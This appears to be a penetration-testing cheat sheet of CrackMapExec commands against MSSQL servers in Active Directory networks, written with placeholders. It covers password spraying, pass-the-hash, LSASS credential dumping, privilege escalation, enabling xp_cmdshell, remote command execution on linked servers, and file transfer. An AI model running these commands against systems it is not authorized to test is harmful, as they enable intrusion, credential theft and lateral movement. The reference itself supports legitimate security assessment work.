# cme (MSSQL)

% cme, crackmapexec, Active Directory, nxc, netexec, mssql

## Enumerate MSSQL reachable hosts
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Anonymous 

Enumerate network hosts that can be reached via MSSQL.

```bash
cme mssql <ip>
```

## Enumerate domain users by RID bruteforce
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Anonymous 

Enumerate domain users by bruteforcing the RID.

```bash
cme mssql <ip> -u <user> -p <password> --rid-brute
```


## Enumerate users with impersonation privileges
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Domain_user 

Enumerate users with impersonation privileges.

```bash
cme mssql <ip> -u <user> -p <password> -M enum_impersonate
```

## Enumerate SQL Server logins
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Domain_user 

Enumerate SQL Server logins.

```bash
cme mssql <ip> -u <user> -p <password> -M enum_logins
```

## Enumerate linked SQL server
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Domain_user 

Enumerate linked SQL Servers and their login configurations.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme mssql <ip> -u <user> -p <password> -M enum_links
```

## Enumerate/exploit MSSQL privileges
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Domain_user 

Enumerate and exploit MSSQL privileges.
ACTION values are : 
    - enum_priv (default) 
    - privesc
    - rollback (remove sysadmin privilege)

```bash
cme mssql <ip> -u <user> -p <password> -M mssql_priv -o ACTION=<action>
```

## MSSQL auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/MSSQL_user 

Authenticate via a MSSQL account on the remote target.

```bash
cme mssql <ip> -u <user> -p <password>
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

Authenticate via a domain account on the remote target.

```bash
cme mssql <ip> -u <user> -p <password> -d <domain>
```

## Domain auth with hash
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

```bash
cme mssql <ip> -u <user> -H <hash> -d <domain>
```

## Local auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme mssql <ip> -u <user> -p <password> --local-auth
```

## Local auth with hash
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Local_user

Authenticate via a local account using the hash on the remote target.

```bash
cme mssql <ip> -u <user> -H <hash> --local-auth
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

Authenticate via Kerberos on the remote target.

```bash
cme mssql <ip> -u <user> -p <password> -k
```

## Kerberos TGT auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

Authenticate via a Kerberos TGT on the remote target.

Previously import ticket : 
    $ export KRB5CCNAME=ticket.ccache

```bash
cme mssql <ip> -u <user> -k --use-kcache
```

## Password spray (username=password)
#assessment/AD #attack_type/Bruteforce #port/1433 #protocol/mssql #access/Anonymous 

Password spray to find accounts with weak passwords.

```bash
cme mssql <ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## Dump LSASS (Nanodump)
#assessment/AD #attack_type/Dump #port/1433 #protocol/mssql #access/Admin 

Dump secrets from the LSASS process memory using methods from Nanodump.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme mssql <ip> -u <user> -p <password> -M nanodump
```

## Execute MSSQL query
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

```bash
cme mssql <ip> -u <user> -p <password> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## Execute remote commands (xp_cmdshell)
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Admin

Execute remote commands through Windows xp_cmdshell.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme mssql <ip> -u <user> -p <password> -x <command>
```

## Execute remote commands (PowerShell)
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Admin

Execute remote commands through Windows PowerShell.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme mssql <ip> -u <user> -p <password> -X <command>
```

## Execute remote commands on linked server
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Execute remote commands on a SQL Server linked server.

```bash
cme mssql <ip> -u <user> -p <password> -M exec_on_link -o LINKED_SERVER=<linked_server> COMMAND=<command>
```

## Execute xp_cmdshell commands on linked server
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Execute xp_cmdshell commands on a SQL Server linked server.

```bash
cme mssql <ip> -u <user> -p <password> -M link_xpcmd -o LINKED_SERVER=<linked_server> CMD=<command>
```

## Execute SQL commands
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Execute arbitrary SQL commands on the target MSSQL server

```bash
cme mssql <ip> -u <user> -p <password> -M mssql_coerce -o LISTENER=<listener>
```

## Enable/disable xp_cmdshell on the server
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Enable/disable xp_cmdshell on a SQL Server.
ACTION values are : 
    - enable (default) 
    - disable

```bash
cme mssql <ip> -u <user> -p <password> -M enable_cmdshell ACTION=<action>
```

## Enable/disable xp_cmdshell on linked server
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Enable/disable xp_cmdshell on a SQL Server linked server.
ACTION values are : 
    - enable (default) 
    - disable

```bash
cme mssql <ip> -u <user> -p <password> -M link_enable_cmdshell -o LINKED_SERVER=<linked_server> ACTION=<action>
```

## Put file
#assessment/AD #attack_type/Other #port/1433 #protocol/mssql #access/Domain_user

Send a local file to the remote target.

```bash
cme mssql <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## Get file
#assessment/AD #attack_type/Other #port/1433 #protocol/mssql #access/Domain_user

Get a local file from the remote target.

```bash
cme mssql <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
